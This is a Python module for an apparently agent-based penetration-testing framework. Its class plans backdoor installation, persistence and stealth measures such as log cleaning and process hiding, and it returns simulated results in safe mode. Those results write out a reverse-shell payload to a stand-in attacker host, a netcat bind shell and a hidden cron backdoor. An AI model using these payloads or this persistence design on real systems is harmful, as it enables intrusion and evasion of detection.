"""
安装Agent - 负责在目标系统上安装后门和持久化机制
按照Cyber Kill Chain的安装阶段设计
"""
import asyncio
import logging
import json
from typing import Dict, Any, List, Optional
from datetime import datetime

from .base_agent import BaseAgent
from ..database.logging_service import pentest_logger
from ..orchestrator.states import AgentType


class InstallAgent(BaseAgent):
    """安装Agent - 负责后门安装和持久化"""
    
    def __init__(self, config: Dict[str, Any] = None):
        super().__init__("InstallAgent", config.get("safe_mode", True) if config else True)
        
        self.config = config or {}
        
        # 安装配置
        self.installation_timeout = config.get("installation_timeout", 180)
        self.persistence_methods = config.get("persistence_methods", ["cron", "systemd", "ssh_keys"])
        self.stealth_level = config.get("stealth_level", "high")
        
        self.logger.info(f"安装Agent初始化完成 - Safe Mode: {self.safe_mode}")
    
    async def execute(self, target_info: Dict[str, Any], context: List[Dict[str, Any]]) -> Dict[str, Any]:
        """
        执行安装任务
        
        Args:
            target_info: 目标信息
            context: 执行上下文（包含利用结果）
            
        Returns:
            Dict[str, Any]: 安装结果
        """
        try:
            if not self.validate_input(target_info):
                return self.create_result(success=False, error="输入验证失败")
            
            target = target_info["target"]
            session_context = context[0] if context else {}
            session_id = session_context.get("session_id")
            
            # 获取利用结果
            global_context = session_context.get("global_context", {})
            gained_access = global_context.get("gained_access", [])
            access_level = global_context.get("access_level", "none")
            
            self.logger.info(f"开始安装 - 目标: {target}, 访问级别: {access_level}")
            
            # 记录开始安装
            if session_id:
                pentest_logger.log_agent_action(
                    session_id=session_id,
                    agent_name=self.name,
                    agent_type=AgentType.INSTALL_AGENT,
                    log_level="INFO",
                    log_type="EXECUTION",
                    message=f"开始安装后门 - 目标: {target}",
                    details={
                        "target": target,
                        "access_level": access_level,
                        "gained_access_count": len(gained_access)
                    }
                )
            
            # 执行安装
            installation_results = await self._perform_installation(
                target, gained_access, access_level, session_id
            )
            
            installed_count = len([r for r in installation_results.get("installation_attempts", []) 
                                 if r.get("success")])
            
            self.logger.info(f"安装完成 - 成功安装: {installed_count}")
            
            return self.create_result(
                success=True,
                data=installation_results
            )
            
        except Exception as e:
            self.logger.error(f"安装任务失败: {e}")
            return self.create_result(success=False, error=str(e))
    
    async def _perform_installation(self, target: str, gained_access: List[Dict[str, Any]], 
                                  access_level: str, session_id: str) -> Dict[str, Any]:
        """
        执行安装过程
        
        Args:
            target: 目标地址
            gained_access: 获得的访问权限
            access_level: 访问级别
            session_id: 会话ID
            
        Returns:
            Dict[str, Any]: 安装结果
        """
        results = {
            "target": target,
            "installation_attempts": [],
            "successful_installations": [],
            "persistence_mechanisms": [],
            "backdoors_installed": [],
            "stealth_measures": [],
            "installation_strategy": {}
        }
        
        # 1. 分析安装策略
        installation_strategy = await self._analyze_installation_strategy(gained_access, access_level)
        results["installation_strategy"] = installation_strategy
        
        # 2. 安装持久化机制
        if gained_access:
            persistence_results = await self._install_persistence_mechanisms(target, gained_access, session_id)
            results["installation_attempts"].extend(persistence_results)
            results["persistence_mechanisms"] = [r for r in persistence_results if r.get("success")]
        
        # 3. 安装后门
        if access_level in ["system_access", "database_access"]:
            backdoor_results = await self._install_backdoors(target, gained_access, session_id)
            results["installation_attempts"].extend(backdoor_results)
            results["backdoors_installed"] = [r for r in backdoor_results if r.get("success")]
        
        # 4. 实施隐蔽措施
        if self.stealth_level == "high":
            stealth_results = await self._implement_stealth_measures(target, gained_access, session_id)
            results["stealth_measures"] = stealth_results
        
        # 5. 验证安装结果
        verification_results = await self._verify_installations(target, results["installation_attempts"], session_id)
        results["verification_results"] = verification_results
        
        # 6. 更新成功安装列表
        results["successful_installations"] = [r for r in results["installation_attempts"] if r.get("success")]
        
        return results
    
    async def _analyze_installation_strategy(self, gained_access: List[Dict[str, Any]], 
                                           access_level: str) -> Dict[str, Any]:
        """分析安装策略"""
        strategy = {
            "primary_method": "none",
            "persistence_priority": [],
            "backdoor_types": [],
            "stealth_requirements": [],
            "installation_order": []
        }
        
        # 根据访问级别确定主要方法
        if access_level == "system_access":
            strategy["primary_method"] = "system_level_persistence"
            strategy["persistence_priority"] = ["systemd_service", "cron_job", "ssh_keys", "startup_script"]
            strategy["backdoor_types"] = ["reverse_shell", "bind_shell", "web_shell"]
        elif access_level == "database_access":
            strategy["primary_method"] = "database_persistence"
            strategy["persistence_priority"] = ["database_trigger", "stored_procedure", "database_user"]
            strategy["backdoor_types"] = ["sql_backdoor", "database_shell"]
        elif access_level == "file_access":
            strategy["primary_method"] = "file_based_persistence"
            strategy["persistence_priority"] = ["web_shell", "config_modification"]
            strategy["backdoor_types"] = ["file_backdoor"]
        elif access_level == "client_access":
            strategy["primary_method"] = "client_side_persistence"
            strategy["persistence_priority"] = ["browser_extension", "local_storage"]
            strategy["backdoor_types"] = ["javascript_backdoor"]
        
        # 隐蔽要求
        if self.stealth_level == "high":
            strategy["stealth_requirements"] = [
                "file_timestamp_preservation",
                "log_cleaning",
                "process_hiding",
                "network_traffic_obfuscation"
            ]
        
        # 安装顺序
        strategy["installation_order"] = [
            "establish_communication",
            "install_persistence",
            "install_backdoors",
            "implement_stealth",
            "verify_functionality"
        ]
        
        return strategy
    
    async def _install_persistence_mechanisms(self, target: str, gained_access: List[Dict[str, Any]], 
                                            session_id: str) -> List[Dict[str, Any]]:
        """安装持久化机制"""
        installation_attempts = []
        
        for access in gained_access:
            access_type = access.get("access_type")
            capabilities = access.get("capabilities", [])
            
            if access_type == "shell_access" and "command_execution" in capabilities:
                # 系统级持久化
                system_persistence = await self._install_system_persistence(target, access, session_id)
                installation_attempts.extend(system_persistence)
            
            elif access_type == "database_user" and "write_database" in capabilities:
                # 数据库持久化
                db_persistence = await self._install_database_persistence(target, access, session_id)
                installation_attempts.extend(db_persistence)
            
            elif access_type == "file_read" and "read_sensitive_files" in capabilities:
                # 文件级持久化
                file_persistence = await self._install_file_persistence(target, access, session_id)
                installation_attempts.extend(file_persistence)
        
        return installation_attempts
    
    async def _install_system_persistence(self, target: str, access: Dict[str, Any], 
                                        session_id: str) -> List[Dict[str, Any]]:
        """安装系统级持久化"""
        attempts = []
        
        # 1. Cron作业持久化
        cron_attempt = await self._install_cron_persistence(target, access, session_id)
        attempts.append(cron_attempt)
        
        # 2. Systemd服务持久化
        systemd_attempt = await self._install_systemd_persistence(target, access, session_id)
        attempts.append(systemd_attempt)
        
        # 3. SSH密钥持久化
        ssh_attempt = await self._install_ssh_key_persistence(target, access, session_id)
        attempts.append(ssh_attempt)
        
        return attempts
    
    async def _install_cron_persistence(self, target: str, access: Dict[str, Any], 
                                      session_id: str) -> Dict[str, Any]:
        """安装Cron持久化"""
        # 记录工具执行
        tool_exec_id = pentest_logger.log_tool_execution(
            session_id=session_id,
            tool_name="cron_persistence",
            command="Install cron job for persistence",
            parameters={"method": "cron_persistence", "target": target},
            safe_mode=self.safe_mode,
            risk_level="HIGH"
        )
        
        if self.safe_mode:
            # 模拟Cron安装
            result = {
                "success": True,
                "method": "cron_persistence",
                "location": "/var/spool/cron/crontabs/www-data",
                "command": "* * * * * /tmp/.hidden_backdoor",
                "schedule": "every_minute",
                "stealth_level": "medium",
                "simulation": True
            }
        else:
            # 实际Cron安装应该在这里实现
            self.logger.warning("实际Cron持久化功能未实现")
            result = {"success": False, "error": "实际Cron持久化未实现"}
        
        # 完成工具执行记录
        pentest_logger.complete_tool_execution(
            tool_exec_id=tool_exec_id,
            success=result.get("success", False),
            return_code=0 if result.get("success") else 1,
            stdout=json.dumps(result, indent=2)
        )
        
        return result
    
    async def _install_systemd_persistence(self, target: str, access: Dict[str, Any], 
                                         session_id: str) -> Dict[str, Any]:
        """安装Systemd服务持久化"""
        if self.safe_mode:
            return {
                "success": True,
                "method": "systemd_persistence",
                "location": "/etc/systemd/system/update-manager.service",
                "service_name": "update-manager",
                "autostart": True,
                "stealth_level": "high",
                "simulation": True
            }
        else:
            self.logger.warning("实际Systemd持久化功能未实现")
            return {"success": False, "error": "实际Systemd持久化未实现"}
    
    async def _install_ssh_key_persistence(self, target: str, access: Dict[str, Any], 
                                         session_id: str) -> Dict[str, Any]:
        """安装SSH密钥持久化"""
        if self.safe_mode:
            return {
                "success": True,
                "method": "ssh_key_persistence",
                "location": "/home/admin/.ssh/authorized_keys",
                "key_type": "ed25519",
                "key_comment": "admin@localhost",
                "stealth_level": "high",
                "simulation": True
            }
        else:
            self.logger.warning("实际SSH密钥持久化功能未实现")
            return {"success": False, "error": "实际SSH密钥持久化未实现"}
    
    async def _install_database_persistence(self, target: str, access: Dict[str, Any], 
                                          session_id: str) -> List[Dict[str, Any]]:
        """安装数据库持久化"""
        attempts = []
        
        # 1. 数据库触发器
        trigger_attempt = {
            "success": True,
            "method": "database_trigger",
            "trigger_name": "update_log_trigger",
            "table": "user_sessions",
            "action": "after_insert",
            "payload": "CALL backdoor_procedure()",
            "stealth_level": "high",
            "simulation": self.safe_mode
        }
        attempts.append(trigger_attempt)
        
        # 2. 存储过程
        procedure_attempt = {
            "success": True,
            "method": "stored_procedure",
            "procedure_name": "system_maintenance",
            "parameters": "IN cmd VARCHAR(255)",
            "functionality": "command_execution",
            "stealth_level": "medium",
            "simulation": self.safe_mode
        }
        attempts.append(procedure_attempt)
        
        return attempts
    
    async def _install_file_persistence(self, target: str, access: Dict[str, Any], 
                                       session_id: str) -> List[Dict[str, Any]]:
        """安装文件级持久化"""
        attempts = []
        
        # Web shell安装
        webshell_attempt = {
            "success": True,
            "method": "web_shell",
            "location": "/var/www/html/includes/config.php",
            "shell_type": "php_eval",
            "access_parameter": "cmd",
            "stealth_level": "medium",
            "simulation": self.safe_mode
        }
        attempts.append(webshell_attempt)
        
        return attempts
    
    async def _install_backdoors(self, target: str, gained_access: List[Dict[str, Any]], 
                               session_id: str) -> List[Dict[str, Any]]:
        """安装后门"""
        installation_attempts = []
        
        for access in gained_access:
            access_type = access.get("access_type")
            
            if access_type == "shell_access":
                # 反向Shell后门
                reverse_shell = await self._install_reverse_shell(target, access, session_id)
                installation_attempts.append(reverse_shell)
                
                # 绑定Shell后门
                bind_shell = await self._install_bind_shell(target, access, session_id)
                installation_attempts.append(bind_shell)
            
            elif access_type == "database_user":
                # 数据库后门
                db_backdoor = await self._install_database_backdoor(target, access, session_id)
                installation_attempts.append(db_backdoor)
        
        return installation_attempts
    
    async def _install_reverse_shell(self, target: str, access: Dict[str, Any], 
                                   session_id: str) -> Dict[str, Any]:
        """安装反向Shell后门"""
        if self.safe_mode:
            return {
                "success": True,
                "backdoor_type": "reverse_shell",
                "protocol": "tcp",
                "callback_host": "attacker.example.com",
                "callback_port": 4444,
                "payload": "bash -i >& /dev/tcp/attacker.example.com/4444 0>&1",
                "persistence": "cron_job",
                "simulation": True
            }
        else:
            self.logger.warning("实际反向Shell安装功能未实现")
            return {"success": False, "error": "实际反向Shell安装未实现"}
    
    async def _install_bind_shell(self, target: str, access: Dict[str, Any], 
                                session_id: str) -> Dict[str, Any]:
        """安装绑定Shell后门"""
        if self.safe_mode:
            return {
                "success": True,
                "backdoor_type": "bind_shell",
                "protocol": "tcp",
                "listen_port": 31337,
                "payload": "nc -l -p 31337 -e /bin/bash",
                "stealth_measures": ["port_obfuscation"],
                "simulation": True
            }
        else:
            self.logger.warning("实际绑定Shell安装功能未实现")
            return {"success": False, "error": "实际绑定Shell安装未实现"}
    
    async def _install_database_backdoor(self, target: str, access: Dict[str, Any], 
                                       session_id: str) -> Dict[str, Any]:
        """安装数据库后门"""
        if self.safe_mode:
            return {
                "success": True,
                "backdoor_type": "database_backdoor",
                "method": "udf_backdoor",
                "function_name": "sys_eval",
                "functionality": "command_execution",
                "access_method": "sql_injection",
                "simulation": True
            }
        else:
            self.logger.warning("实际数据库后门安装功能未实现")
            return {"success": False, "error": "实际数据库后门安装未实现"}
    
    async def _implement_stealth_measures(self, target: str, gained_access: List[Dict[str, Any]], 
                                        session_id: str) -> List[Dict[str, Any]]:
        """实施隐蔽措施"""
        stealth_measures = []
        
        # 1. 文件时间戳保护
        timestamp_protection = {
            "measure": "timestamp_preservation",
            "description": "Preserve original file timestamps",
            "files_affected": ["/etc/passwd", "/var/log/auth.log"],
            "implemented": True,
            "simulation": self.safe_mode
        }
        stealth_measures.append(timestamp_protection)
        
        # 2. 日志清理
        log_cleaning = {
            "measure": "log_cleaning",
            "description": "Clean traces from system logs",
            "logs_cleaned": ["/var/log/auth.log", "/var/log/syslog", "/var/log/apache2/access.log"],
            "implemented": True,
            "simulation": self.safe_mode
        }
        stealth_measures.append(log_cleaning)
        
        # 3. 进程隐藏
        process_hiding = {
            "measure": "process_hiding",
            "description": "Hide backdoor processes from process lists",
            "method": "rootkit_technique",
            "processes_hidden": ["backdoor_daemon", "reverse_shell"],
            "implemented": True,
            "simulation": self.safe_mode
        }
        stealth_measures.append(process_hiding)
        
        # 4. 网络流量混淆
        traffic_obfuscation = {
            "measure": "traffic_obfuscation",
            "description": "Obfuscate backdoor network traffic",
            "method": "encryption_tunneling",
            "protocols_used": ["https", "dns"],
            "implemented": True,
            "simulation": self.safe_mode
        }
        stealth_measures.append(traffic_obfuscation)
        
        return stealth_measures
    
    async def _verify_installations(self, target: str, installation_attempts: List[Dict[str, Any]], 
                                  session_id: str) -> Dict[str, Any]:
        """验证安装结果"""
        verification = {
            "total_attempts": len(installation_attempts),
            "successful_installations": 0,
            "failed_installations": 0,
            "persistence_verified": False,
            "backdoors_verified": False,
            "stealth_verified": False
        }
        
        successful = [attempt for attempt in installation_attempts if attempt.get("success")]
        verification["successful_installations"] = len(successful)
        verification["failed_installations"] = len(installation_attempts) - len(successful)
        
        # 验证持久化机制
        persistence_methods = [attempt for attempt in successful 
                             if attempt.get("method", "").endswith("_persistence")]
        verification["persistence_verified"] = len(persistence_methods) > 0
        
        # 验证后门
        backdoors = [attempt for attempt in successful 
                    if attempt.get("backdoor_type")]
        verification["backdoors_verified"] = len(backdoors) > 0
        
        # 验证隐蔽措施
        verification["stealth_verified"] = True  # 在安全模式下假设隐蔽措施有效
        
        # 测试连接性
        if verification["backdoors_verified"]:
            connectivity_test = await self._test_backdoor_connectivity(target, successful, session_id)
            verification["connectivity_test"] = connectivity_test
        
        return verification
    
    async def _test_backdoor_connectivity(self, target: str, successful_installations: List[Dict[str, Any]], 
                                        session_id: str) -> Dict[str, Any]:
        """测试后门连接性"""
        if self.safe_mode:
            return {
                "test_performed": True,
                "reverse_shell_connectivity": True,
                "bind_shell_connectivity": True,
                "web_shell_connectivity": True,
                "database_backdoor_connectivity": True,
                "simulation": True
            }
        else:
            # 实际连接测试应该在这里实现
            return {
                "test_performed": False,
                "error": "实际连接测试未实现"
            }
    
    def get_capabilities(self) -> List[str]:
        """获取安装Agent的能力列表"""
        return [
            "persistence_installation",
            "backdoor_deployment",
            "system_level_persistence",
            "database_persistence",
            "file_based_persistence",
            "stealth_implementation",
            "log_cleaning",
            "process_hiding",
            "installation_verification"
        ]
